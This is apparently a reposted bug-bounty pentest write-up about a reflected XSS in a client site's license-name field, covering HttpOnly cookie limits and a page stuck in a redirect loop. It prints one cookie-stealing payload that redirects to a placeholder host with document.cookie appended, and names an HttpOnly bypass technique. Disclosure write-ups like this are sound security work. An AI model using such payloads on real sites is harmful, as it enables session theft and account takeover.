# :globe_with_meridians: The weirdest bug:When Reflected XSS Won’t Let a Page Breathe

> **Original Source:** [The weirdest bug:When Reflected XSS Won’t Let a Page Breathe](https://infosecwriteups.com/the-weirdest-bug-when-reflected-xss-wont-let-a-page-breathe-58be5cdfb569)
> **Platform:** infosecwriteups.com | **Category:** `WEB`

---

# The weirdest bug:When Reflected XSS Won’t Let a Page Breathe


*Hello Pentesters — hope you’re well.
Today I’m sharing a short write-up of a reflected XSS I discovered while conducting a contracted pentest for a company that runs a critical website and needs strong security (let’s call it EXAMPLE.COM).*

>

*Note: this was a private assessment, so I can’t disclose the real name — EXAMPLE.COM will be used throughout.Alright — let’s do it !*


## *Initial Discoverythey gave me a worker-level account and activated the product license. With that low‑privilege access I just hung around the app, poking at features and inputs with my user rights to see if (For client and company privacy reasons, I’ve blurred any sensitive)*


*Without hesitation the first thing I thought of was changing the user’s license name by injecting an XSS payload into that field. I opened Burp Suite and began testing the input.*


*Here’s what the user license modification page looks like*


*So here we inserted our XSS payload and tested it.*


*and boom !*


*Easyyyyy, rightttt? We report it and get paid — job done? Nah, don’t be dumb. You have to handle this the right way; that’s how a pentester should operate. So what next? Calm down — my goal wasn’t just to report it; I wanted to exploit it to escalate privileges and gain the Admin user.While poking around I checked the cookie flags — *`*HttpOnly*`* was set. That moment felt like a small victory and a small speed bump at the same time.*


## Get Helmiriahi’s stories in your inbox


Join Medium for free to get updates from this writer.


Remember me for faster sign in


`*HttpOnly*`* basically tells the browser “don’t hand this cookie to any JavaScript.” So if you’re expecting the classic *`*document.cookie → send to attacker*`* trick, that door is closed. Nice to have, and something every dev should do.*


*But it didn’t stop the show. In my case the cookie being *`*HttpOnly*`* only meant I couldn’t directly read the session value from JS — it didn’t stop the injected script from running, or the browser from making authenticated requests with that cookie attached. From the attacker’s perspective that still allows actions to be performed as the victim (changing settings, hitting internal endpoints, etc.), and it still allows exfiltration of anything visible in the DOM or returned by same‑origin APIs. In short: *`*HttpOnly*`* reduced the easiest form of cookie theft, but it didn’t neutralize the impact of the XSS — and it certainly didn’t prevent the page from getting stuck in that endless reload loop while my payload kept failing to reach its external receiver.So i have changed the Payload like this one :*


```
<script>document.location='http://TypeWrongIp That he Cant Reach/cookie='+document.cookie</script>
```


*and the page became stuck in that state.*


*If you want to bypass HttpOnly flag you can read about (cookie Sandwich technique ) .*

>

*In the end, the company recognized it as a critical vulnerability, and I received the bounty reward.Thanks for following along and follow to get more !Contact :*[helmi riahi | LinkedIn](https://www.linkedin.com/in/helmi-riahi-9b3751243/)


*helmiriahi147@gmail.com*

---

*Originally published on [Medium](https://infosecwriteups.com/the-weirdest-bug-when-reflected-xss-wont-let-a-page-breathe-58be5cdfb569). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of web CTF writeups.*
